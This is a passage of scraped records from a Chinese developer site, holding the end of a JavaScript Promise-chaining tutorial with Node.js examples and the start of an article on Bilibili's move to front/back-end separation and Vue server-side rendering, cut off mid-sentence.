back\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以看到，多个延时的回调函数被有序的排列下来，并没有出现喜闻乐见的金字塔状结构。虽然代码里面调用的都是异步过程，但是看起来就像是全部由同步过程构成的一样。这就是Promise带给我们的好处。\u003c/p\u003e\n\u003cp\u003e如果你有把啰嗦的代码提炼成单独函数的好习惯，那就更加画美不看了：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003etimeout1\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start timeout1\"\u003c/span\u003e);\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e);\n\u0009});\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003etimeout2\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start timeout2\"\u003c/span\u003e);\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e);\n\u0009});\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003etimeout3\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start timeout3\"\u003c/span\u003e);\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e4000\u003c/span\u003e);\n\u0009});\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003etimeout4\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start timeout4\"\u003c/span\u003e);\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e5000\u003c/span\u003e);\n\u0009});\n}\n\ntimeout1()\n\u0009.then(timeout2)\n\u0009.then(timeout3)\n\u0009.then(timeout4)\n\u0009.then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timout4 callback\"\u003c/span\u003e);\n\u0009});\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ node promisTest.js\n1450278983342 start timeout1\n1450278985343 start timeout2\n1450278988351 start timeout3\n1450278992356 start timeout4\n1450278997370 timout4 callback\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来我们可以再继续研究一下\u003ccode\u003eonFulfilled\u003c/code\u003e函数传入入参的问题。\u003c/p\u003e\n\u003cp\u003e我们已经知道，如果上一个\u003ccode\u003eonFulfilled\u003c/code\u003e函数返回了一个普通的值，那么这个值为作为这个\u003ccode\u003eonFulfilled\u003c/code\u003e函数的入参；那么如果上一个\u003ccode\u003eonFulfilled\u003c/code\u003e返回了一个Promise变量，这个\u003ccode\u003eonFulfilled\u003c/code\u003e的入参又来自哪里？\u003c/p\u003e\n\u003cp\u003e答案是，这个\u003ccode\u003eonFulfilled\u003c/code\u003e函数的入参，是上一个Promise中调用\u003ccode\u003eresolve\u003c/code\u003e函数时传入的值。\u003c/p\u003e\n\u003cp\u003e跳跃的有点大一时间无法接受对不对，让我们来好好缕一缕。\u003c/p\u003e\n\u003cp\u003e首先，Promise.resolve这个函数是什么，用MDN上面文邹邹的说法\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e用成功值value解决一个Promise对象。如果该value为可继续的（thenable，即带有then方法），返回的Promise对象会“跟随”这个value，采用这个value的最终状态；否则的话返回值会用这个value满足（fullfil）返回的Promise对象。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e简而言之，这就是异步调用成功情况下的回调。\u003c/p\u003e\n\u003cp\u003e我们来看看普通的异步接口中，成功情况的回调是什么样的，就拿nodejs的上的\u003ccode\u003efs.readFile(file[, options], callback)\u003c/code\u003e来说，它的典型调用例子如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003efs.readFile(\u003cspan class=\"hljs-string\"\u003e'/etc/passwd'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eerr, data\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (err) \u003cspan class=\"hljs-keyword\"\u003ethrow\u003c/span\u003e err;\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(data);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e因为对于\u003ccode\u003efs.readFile\u003c/code\u003e这个函数而言，无论成功还是失败，它都会调用callback这个回调函数，所以这个回调接受两个入参，即失败时的异常描述\u003ccode\u003eerr\u003c/code\u003e和成功时的返回结果\u003ccode\u003edata\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e那么假如我们用Promise来重构这个读取文件的例子，我们应该怎么写呢？\u003c/p\u003e\n\u003cp\u003e首先是封装\u003ccode\u003efs.readFile\u003c/code\u003e函数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ereadFile\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003efileName\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eresolve, reject\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009fs.readFile(fileName, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eerr, data\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (err) {\n\u0009\u0009\u0009\u0009reject(err);\n\u0009\u0009\u0009} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n\u0009\u0009\u0009\u0009resolve(data);\n\u0009\u0009\u0009}\n\u0009\u0009});\n\u0009});\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其次是调用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ereadFile(\u003cspan class=\"hljs-string\"\u003e'theFile.txt'\u003c/span\u003e).then(\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(data);\n\u0009}, \n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003ethrow\u003c/span\u003e err;\n\u0009}\u0009\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e想象一下，在其他语言的读取文件的同步调用接口的里面，文件的内容通常是放在哪里？函数返回值对不对！答案出来了，这个\u003ccode\u003eresolve\u003c/code\u003e的入参是什么？就是异步调用成功情况下的返回值。\u003c/p\u003e\n\u003cp\u003e有了这个概念之后，我们就不难理解“\u003ccode\u003eonFulfilled\u003c/code\u003e函数的入参，是上一个Promise中调用\u003ccode\u003eresolve\u003c/code\u003e函数时传入的值”这件事了。因为\u003ccode\u003eonFulfilled\u003c/code\u003e的任务，就是对上一个异步调用成功后的结果做处理的。\u003c/p\u003e\n\u003cp\u003e哎终于理顺了。。。\u003c/p\u003e\n\u003cp\u003e#总结\u003c/p\u003e\n\u003cp\u003e下面请允许我用一段代码对本文讲解到的要点进行总结：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ecallp1\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start callp1\"\u003c/span\u003e);\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e);\n\u0009});\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ecallp2\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start callp2\"\u003c/span\u003e);\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u0009res({\u003cspan class=\"hljs-attr\"\u003earg1\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003earg2\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"arg2 value\"\u003c/span\u003e});\n\u0009\u0009}, \u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e);\n\u0009});\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ecallp3\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003earg\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start callp3 with arg = \"\u003c/span\u003e + arg);\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u0009res(\u003cspan class=\"hljs-string\"\u003e\"callp3\"\u003c/span\u003e);\n\u0009\u0009}, arg * \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e);\n\u0009});\n}\n\ncallp1().then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" callp1 return\"\u003c/span\u003e);\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e callp2();\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eret\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" callp2 return with ret value = \"\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.stringify(ret));\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e callp3(ret.arg1);\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eret\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" callp3 return with ret value = \"\u003c/span\u003e + ret);\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ node promisTest.js\n1450191479575 start callp1\n1450191481597 callp1 \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e\n1450191481599 start callp2\n1450191484605 callp2 \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e with ret value = {\u003cspan class=\"hljs-string\"\u003e\"arg1\"\u003c/span\u003e:4,\u003cspan class=\"hljs-string\"\u003e\"arg2\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"arg2 value\"\u003c/span\u003e}\n1450191484605 start callp3 with arg = 4\n1450191488610 callp3 \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e with ret value = callp3\n\u003c/code\u003e\u003c/pre\u003e\u003chr\u003e\n","buildTime":"1514894583.2186","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3e0"},"id":"5a473a2df265da431441098c","author":{"$oid":"5a4b76338b69bb25d83da3c5"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/30/160a63be250b3efc?w=590\u0026h=256\u0026f=png\u0026s=10388","https://user-gold-cdn.xitu.io/2017/12/30/160a6410762ef8dd?w=1920\u0026h=949\u0026f=png\u0026s=142240","https://user-gold-cdn.xitu.io/2017/12/30/160a63de505b4cc9?w=985\u0026h=368\u0026f=png\u0026s=32625","https://user-gold-cdn.xitu.io/2017/12/30/160a63f471236033?w=213\u0026h=114\u0026f=png\u0026s=3641","https://user-gold-cdn.xitu.io/2017/12/30/160a6400bb0013be?w=1855\u0026h=480\u0026f=png\u0026s=140959","https://user-gold-cdn.xitu.io/2017/12/30/160a6402e1ea9b85?w=651\u0026h=522\u0026f=png\u0026s=19155","https://user-gold-cdn.xitu.io/2017/12/30/160a6405d59b38e1?w=607\u0026h=598\u0026f=png\u0026s=16005"],"screenShot":null}],"title":"哔哩哔哩（B站）的前端之路","meta":{"likeCount":0},"tag":["前端","前端框架"],"comment":[],"shortContent":"过去的开发模式中，我们采用了以后端为主的 MVC 架构方式。具体来说，每次项目评审后，前后端会先一起约定好接口，之后分别进行开发，开发完，前端需要把页面提供给后端，后端配置上数据，然后返回出来。正式基于这样的开发模式，导致了总工作量的增加，同时沟通和联调成本的消耗也十分显著。 …","content":"\u003cp\u003e2017年即将过去了，总结一下B站的前端进阶之路\u003c/p\u003e\n\u003cp\u003e过去的开发模式中，我们采用了以后端为主的 MVC 架构方式。具体来说，每次项目评审后，前后端会先一起约定好接口，之后分别进行开发，开发完，前端需要把页面提供给后端，后端配置上数据，然后返回出来。正式基于这样的开发模式，导致了总工作量的增加，同时沟通和联调成本的消耗也十分显著。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e前后端分离\u003c/h2\u003e\n\u003cp\u003e为了摆脱这种前后端过分依赖的情况，（其实前端也不想每次修改或者发布都要后端这边发布，后端也不想每次前端只改个标题，都要发布一下,影响服务的稳定性），那么先从前后端分离开始吧~\u003c/p\u003e\n\u003cp\u003e前后端分离，最基本的两种模式，有中间层和没有中间层。\u003c/p\u003e\n\u003cp\u003e第一种，没有web中间层就很简单，提供一个html模板放到静态资源机上面，html模板里面引用了所需的js和css\n,访问页面的时候 把这个静态模板返回给用户，然后执行js 在浏览器端通过ajax请求api拿到数据，渲染页面。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a63be250b3efc?w=590\u0026amp;h=256\u0026amp;f=png\u0026amp;s=10388\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n（前后端分离）\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e第二种，有node中间层，随着2009年，Node的横空出世，把前端慢慢的推向了后端，有了node之后，JavaScript可以做更多的事情。\u003c/p\u003e\n\u003cp\u003eB站，一开始做前后端分离的时候，也确实按照第一种方式去做的,现在还有一些页面仍然是这种模式,例如:\u003ca target=\"_blank\" href=\"%E5%8E%86%E5%8F%B2%E7%BA%AA%E5%BD%95\"\u003ehttps://www.bilibili.com/account/history\u003c/a\u003e (可查看网页源代码)。对于不需要seo的页面来说，是一个不错的方式。前端开发完成之后，通过webpack打包出对应的js和css 上传到cdn上面，然后将webpack打包出来的 引用了对应的资源的html文件 上传到一台专门的静态机上面，然后运维配置路由 将页面流量导过去就好了。后端的同学只需要提供对应的api接口就可以。前后端分开维护，自己按照自己的节奏走，降低了页面与服务的耦合度\u003c/p\u003e\n\u003cp\u003e这种方式确实是一种很快能够进行前后端分离的方法。我们花了一段时间，在pc端使用vue 进行重构，移动端H5端 用react\n进行了重构。 进度很快，但是也慢慢展现出了弊端。\u003c/p\u003e\n\u003cp\u003e首屏的时候，因为他要等待资源加载完成，然后再进行渲染，会导致了首屏有白屏，如果是单页面还好，如果是spa应用 那么 他的加载时间就会变得很长，白屏时间会很影响用户体验，再有就是由于国内的搜索公司 对于spa 应用没有很好的兼容，导致了客户端渲染会对seo非常的不友好，有seo 需求的页面就很迫切的需要服务端渲染。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6410762ef8dd?w=1920\u0026amp;h=949\u0026amp;f=png\u0026amp;s=142240\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n（B站的首页，右边模块做了服务端渲染，左边模块没有做服务端渲染）\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e那么，依赖node 进行服务端渲染就被提上了日程。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e选型\u003c/h2\u003e\n\u003cp\u003e首先进行node 框架的选型，市面上主流框架有三种，hapi express koa ,还有一些是经过一些封装和定制的框架，例如 eggjs等\u003c/p\u003e\n\u003cp\u003e一开始我就把eggjs 排除在外了，第一\n因为eggjs,的功能很强大，有很多功能，多到有些根本用不着，从而导致了他会重 不轻量级，第二，eggjs对于我来说是个黑盒，如果有什么问题，我解决起来将会花费很长的时间。（但是有很多地方 我还是借鉴了eggjs的，毕竟 很强大）\u003c/p\u003e\n\u003cp\u003e然后剩下的三种框架，express的使用相对简单，文档也比较多\n比较全面，所以我就选择了express(后来还是重构掉了 = =!)\u003c/p\u003e\n\u003cp\u003e然后是前端框架的选型 因为前端框架主流的有很多，ng r v 等等，我站在用的是react和vue, 他们有个优势就是可以进行前后端同构，一样的逻辑不用写两份，很棒\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a63de505b4cc9?w=985\u0026amp;h=368\u0026amp;f=png\u0026amp;s=32625\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n（同构逻辑大概如此吧）\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e由于之前前后端分离的时候，pc\n上面已经再用vue 进行了重构，所以自然，这次服务端渲染也建立在vue上面 用的是vue ssr (这也为我后面的一个想法埋下了伏笔)\u003c/p\u003e\n\u003cp\u003e首先 我们选择一个简单的页面来做打样，就用tag页吧（被神选中的孩子：\u003ca target=\"_blank\" href=\"tag%E9%A1%B5\"\u003ehttps://www.bilibili.com/tag/3503159\u003c/a\u003e ）\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e开发\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e目录结构\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eclient 【客户端代码 同构代码】\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ebuild 【构建相关】\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePC 【pc 端 vue项目】\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003epackage.json\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003econfig\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003econfig.local.js 【本地开发配置】\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003edist 【构建目录 挂载资源目录】\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eserver 【服务端代码】\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003econtroller 【控制器】\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePC\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eroute.js\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ecore [核心代码库]\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eservice [方法库]\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eview [视图]\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePC [vue 构建后文件]\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003etag.html [构建后的模板]\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003etag.json [构建后的bundle]\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emanifest.json\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eapps.js [启动项]\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在一开始设计的时候，客户端代码和服务端代码放在同一个git库里面，client里面是vue的代码和webpack的打包逻辑。Server里是服务端的代码，用的是类mvc结构。\u003c/p\u003e\n\u003cp\u003eClient里面的vue的开发代码，参照的就是vue ssr 官方给的例子来做的，用的是 createBundleRender方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst { createBundleRenderer } = require(\u003cspan class=\"hljs-string\"\u003e'vue-server-renderer'\u003c/span\u003e)\nconst renderer = createBundleRenderer(serverBundle, {\n... })\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e构建配置也是用的推荐的配置（参考：\u003ca target=\"_blank\" href=\"ssr\"\u003ehttps://ssr.vuejs.org/zh/build-config.html\u003c/a\u003e ）\u003c/p\u003e\n\u003cp\u003e简单来说，就是提供两个入口，一个entry-client.js,主要是客户端的执行入口， 打包出来的是客户端的引用代码集合（manifest），另外一个是entry-server.js 打包出来的是服务端运行的逻辑,整合到了bundle.json里面。然后传给上面的createBundleRender方法就可以了\u003c/p\u003e\n\u003cp\u003e对于server文件夹里面的逻辑就非常简单了，core里面是启动项目的一些express的核心代码 路由注册什么的逻辑，值得一说的是，这边的路由，借鉴了eggjs的路由注册方式，稍微做了一点修改，用的是配置化的方式\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a63f471236033?w=213\u0026amp;h=114\u0026amp;f=png\u0026amp;s=3641\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n配置优于代码，将访问地址和对应的controller 做了关联\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这边还有一个filter 其实就是在执行controller之前 注册进一个middlewares 优先执行（其实这边有点局限性，后处理没法做）\u003c/p\u003e\n\u003cp\u003e这边我忽略了压力测试，压力测试我后面再说把\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e上线部署\u003c/h2\u003e\n\u003cp\u003e上线部署用的是docker\n来部署的，配置是1C 4G的配置，用了两个实例来运行，（之前的构建镜像逻辑什么的 就不具体介绍了）\u003c/p\u003e\n\u003cp\u003e上线之后 每天的访问量大概在100W左右，服务表现挺稳定，期间出现了一个bug,就是 这边有一个状态与用户的登陆状态有关，所以在服务端请求接口的时候，需要带上cookie去请求，当时忘记加了 后来加上，发现这个有点弊端 比较麻烦\u003c/p\u003e\n\u003cp\u003e需要在调用vuesssr的时候带在context 里面，然后asyncData方法里面都要一层一层的传递，最后在action 里面拿到，带给api\u003c/p\u003e\n\u003cp\u003e这时候 